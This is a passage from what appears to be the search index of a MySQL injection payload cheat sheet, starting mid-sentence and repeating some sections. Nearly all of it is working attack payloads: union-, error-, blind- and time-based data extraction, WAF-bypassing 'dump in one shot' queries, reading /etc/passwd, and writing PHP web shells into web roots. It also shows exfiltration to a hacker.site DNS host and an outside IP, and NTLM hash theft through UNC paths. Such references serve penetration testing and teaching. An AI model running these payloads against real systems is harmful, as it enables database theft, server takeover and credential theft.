statements have a different number of columns 1' LIMIT 1,1 INTO @,@,@--+ #No error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True Using SELECT * FROM SOME_EXISTING_TABLE Error Based This works if you know the table name you're after and error showing is enabled. It will return the amount of columns in the table, not the query. 1' AND (SELECT * FROM Users) = 1--+ #Operand should contain 3 column(s) # This error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True Extract database with information_schema Then the following codes will extract the databases'name, tables'name, columns'name. UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+... Extract columns name without information_schema Method for MySQL >= 4.1 . First extract the column number with ?id=(1)and(SELECT * from db.users)=(1) -- Operand should contain 4 column(s) Then extract the column name. ?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1) --Column 'id' cannot be null Method for MySQL 5 -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a --#1060 - Duplicate column name 'id' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a -- #1060 - Duplicate column name 'name' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a ... Extract data without columns name Extracting data from the 4th column without knowing its name. select `4` from (select 1,2,3,4,5,6 union select * from users)dbname; Injection example inside the query select author_id,title from posts where author_id=[INJECT_HERE] MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1); +-----------+-----------------------------------------------------------------+ | author_id | title | +-----------+-----------------------------------------------------------------+ | 1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org | +-----------+-----------------------------------------------------------------+ MYSQL Error Based MYSQL Error Based - Basic Works with MySQL >= 4.1 (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)) '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+' MYSQL Error Based - UpdateXML function AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)-- Shorter to read: ' and updatexml(null,concat(0x0a,version()),null)-- - ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- - MYSQL Error Based - Extractvalue function Works with MySQL >= 5.1 ?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))-- MYSQL Error Based - NAME_CONST function (only for constants) Works with MySQL >= 5.0 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)-- MYSQL Blind MYSQL Blind with substring equivalent ?id=1 and substring(version(),1,1)=5 ?id=1 and right(left(version(),1),1)=5 ?id=1 and left(version(),1)=4 ?id=1 and ascii(lower(substr(Version(),1,1)))=51 ?id=1 and (select mid(version(),1,1)=4) ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A' ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A' MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output. [...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP \"^[BRUTEFORCE CHAR BY CHAR].*\" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- - MySQL Blind SQL Injection binary query using REGEXP. Payload: ' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- - Would work in the query (where the \"where\" clause is the injection point): SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -'; In said query, it will check to see if an item exists in the \"name\" column in the \"items\" database that starts with an \"a\". If it will sleep for 3 seconds per item. MYSQL Blind using a conditional statement TRUE: if @@version starts with a 5 : 2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 Response: HTTP/1.1 500 Internal Server Error False: if @@version starts with a 4 : 2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2 Response: HTTP/1.1 200 OK MYSQL Blind with MAKE_SET AND MAKE_SET(YOLO<(SELECT(length(version()))),1) AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1) AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1) AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1) MYSQL Blind with LIKE '_' acts like the regex character '.', use it to speed up your blind testing SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l'; MYSQL Time Based The following SQL codes will delay the output from MySQL. +BENCHMARK(40000000,SHA1(1337))+ '%2Bbenchmark(3200,SHA1(1))%2B' AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')) //SHA1 RLIKE SLEEP([SLEEPTIME]) OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) Using SLEEP in a subselect 1 and (select sleep(10) from dual where database() like '%')# 1 and (select sleep(10) from dual where database() like '___')# 1 and (select sleep(10) from dual where database() like '____')# 1 and (select sleep(10) from dual where database() like '_____')# 1 and (select sleep(10) from dual where database() like 'a____')# ... 1 and (select sleep(10) from dual where database() like 's____')# 1 and (select sleep(10) from dual where database() like 'sa___')# ... 1 and (select sleep(10) from dual where database() like 'sw___')# 1 and (select sleep(10) from dual where database() like 'swa__')# 1 and (select sleep(10) from dual where database() like 'swb__')# 1 and (select sleep(10) from dual where database() like 'swi__')# ... 1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')# Using conditional statements ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) -- ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) -- ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 MYSQL DIOS - Dump in One Shot (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)# (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)# -- SecurityIdiots make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Profexer (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a) -- Dr.Z3r0 (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)) -- M@dBl00d (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)) -- Zen +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Zen WAF (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a) -- ~tr0jAn WAF +concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+ -- ~tr0jAn Benchmark +concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+ -- N1Z4M WAF +/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+ -- sharik (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a) MYSQL Current queries This table can list all operations that DB is performing at the moment. union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST # -- Dump in one shot example for the table content. union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 # MYSQL Read content of a file Need the filepriv , otherwise you will get the error : ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement ' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php')); If you are root on the database, you can re-enable the LOAD_FILE using the following query GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;# MYSQL Write a shell Into outfile method [...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\" [...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>' [...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- - [...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php' Into dumpfile method [...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php' [...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php'; MYSQL Truncation In MYSQL \" admin \" and \" admin \" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed. `username` varchar(20) not null Payload: username = \"admin a\" MYSQL Fast Exploitation Requirement: MySQL >= 5.7.22 Use json_arrayagg() instead of group_concat() which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() > 16,000,000 symbols SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES; MYSQL UDF command execution First you need to check if the UDF are installed on the server. $ whereis lib_mysqludf_sys.so /usr/lib/lib_mysqludf_sys.so Then you can use functions such as sys_exec and sys_eval . $ mysql -u root -p mysql Enter password: [...] mysql> SELECT sys_eval('id'); +--------------------------------------------------+ | sys_eval('id') | +--------------------------------------------------+ | uid=118(mysql) gid=128(mysql) groups=128(mysql) | +--------------------------------------------------+ MYSQL Out of band select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt'; select @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt DNS exfiltration select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt')); select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)) UNC Path - NTLM hash stealing select load_file('\\\\\\\\error\\\\abc'); select load_file(0x5c5c5c5c6572726f725c5c616263); select 'osanda' into dumpfile '\\\\\\\\error\\\\abc'; select 'osanda' into outfile '\\\\\\\\error\\\\abc'; load data infile '\\\\\\\\error\\\\abc' into table database.table_name; References MySQL Out of Band Hacking - @OsandaMalith [Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148 Help \u043f\u043e MySql \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u044f\u043c - rdot.org SQL Truncation Attack - Warlock HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman SQL Wiki - netspi ekoparty web_100 - 2016/10/26 - p4-team Websec - MySQL - Roberto Salgado - May 29, 2013.","title":"MYSQL Injection"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-injection","text":"","title":"MYSQL Injection"},{"location":"SQL%20Injection/MySQL%20Injection/#summary","text":"MYSQL Comment MYSQL Union Based Detect columns number Extract database with information_schema Extract columns name without information_schema Extract data without columns name MYSQL Error Based MYSQL Error Based - Basic MYSQL Error Based - UpdateXML function MYSQL Error Based - Extractvalue function MYSQL Blind MYSQL Blind with substring equivalent MYSQL Blind using a conditional statement MYSQL Blind with MAKE_SET MYSQL Blind with LIKE MYSQL Time Based Using SLEEP in a subselect Using conditional statements MYSQL DIOS - Dump in One Shot MYSQL Current queries MYSQL Read content of a file MYSQL Write a shell Into outfile method Into dumpfile method MYSQL UDF command execution MYSQL Truncation MYSQL Fast Exploitation MYSQL Out of band DNS exfiltration UNC Path - NTLM hash stealing References","title":"Summary"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-comment","text":"# MYSQL Comment -- comment [Note the space after the double dash] /* MYSQL Comment */ /*! MYSQL Special SQL */ /*!32302 10*/ Comment for MYSQL version 3.23.02","title":"MYSQL comment"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-union-based","text":"","title":"MYSQL Union Based"},{"location":"SQL%20Injection/MySQL%20Injection/#detect-columns-number","text":"First you need to know the number of columns","title":"Detect columns number"},{"location":"SQL%20Injection/MySQL%20Injection/#using-order-by-or-group-by","text":"Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query. 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True or 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True","title":"Using order by or group by"},{"location":"SQL%20Injection/MySQL%20Injection/#using-order-by-or-group-by-error-based","text":"Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled. 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause' # This error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True or 1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'group statement' # This error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True","title":"Using order by or group by Error Based"},{"location":"SQL%20Injection/MySQL%20Injection/#using-union-select-error-based","text":"This method works if error showing is enabled 1' UNION SELECT @--+ #The used SELECT statements have a different number of columns 1' UNION SELECT @,@--+ #The used SELECT statements have a different number of columns 1' UNION SELECT @,@,@--+ #No error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True","title":"Using UNION SELECT Error Based"},{"location":"SQL%20Injection/MySQL%20Injection/#using-limit-into-error-based","text":"This method works if error showing is enabled. It is useful for finding the number of columns when the injection point is after a LIMIT clause. 1' LIMIT 1,1 INTO @--+ #The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@--+ #The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@,@--+ #No error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True","title":"Using LIMIT INTO Error Based"},{"location":"SQL%20Injection/MySQL%20Injection/#using-select-from-some_existing_table-error-based","text":"This works if you know the table name you're after and error showing is enabled. It will return the amount of columns in the table, not the query. 1' AND (SELECT * FROM Users) = 1--+ #Operand should contain 3 column(s) # This error means query uses 3 column #-1' UNION SELECT 1,2,3--+ True","title":"Using SELECT * FROM SOME_EXISTING_TABLE Error Based"},{"location":"SQL%20Injection/MySQL%20Injection/#extract-database-with-information_schema","text":"Then the following codes will extract the databases'name, tables'name, columns'name. UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...","title":"Extract database with information_schema"},{"location":"SQL%20Injection/MySQL%20Injection/#extract-columns-name-without-information_schema","text":"Method for MySQL >= 4.1 . First extract the column number with ?id=(1)and(SELECT * from db.users)=(1) -- Operand should contain 4 column(s) Then extract the column name. ?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1) --Column 'id' cannot be null Method for MySQL 5 -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a --#1060 - Duplicate column name 'id' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a -- #1060 - Duplicate column name 'name' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a ...","title":"Extract columns name without information_schema"},{"location":"SQL%20Injection/MySQL%20Injection/#extract-data-without-columns-name","text":"Extracting data from the 4th column without knowing its name. select `4` from (select 1,2,3,4,5,6 union select * from users)dbname; Injection example inside the query select author_id,title from posts where author_id=[INJECT_HERE] MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1); +-----------+-----------------------------------------------------------------+ | author_id | title | +-----------+-----------------------------------------------------------------+ | 1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org | +-----------+-----------------------------------------------------------------+","title":"Extract data without columns name"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based","text":"","title":"MYSQL Error Based"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-basic","text":"Works with MySQL >= 4.1 (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)) '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'","title":"MYSQL Error Based - Basic"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-updatexml-function","text":"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)-- Shorter to read: ' and updatexml(null,concat(0x0a,version()),null)-- - ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -","title":"MYSQL Error Based - UpdateXML function"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-extractvalue-function","text":"Works with MySQL >= 5.1 ?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--","title":"MYSQL Error Based - Extractvalue function"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-error-based-name_const-function-only-for-constants","text":"Works with MySQL >= 5.0 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--","title":"MYSQL Error Based - NAME_CONST function (only for constants)"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-blind","text":"","title":"MYSQL 